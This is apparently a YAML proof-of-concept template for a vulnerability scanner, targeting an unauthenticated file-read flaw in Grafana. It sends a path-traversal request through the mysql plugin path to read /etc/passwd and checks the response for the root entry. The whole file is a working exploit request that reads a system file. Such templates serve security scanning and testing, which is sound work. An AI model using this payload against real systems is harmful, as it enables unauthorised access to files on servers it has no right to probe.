name: poc-yaml-grafana-unauth-fileread
rules:
  - method: GET
    path: /public/plugins/mysql/../../../../../../../../../../../../../../../../../etc/passwd
    expression: |
      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)

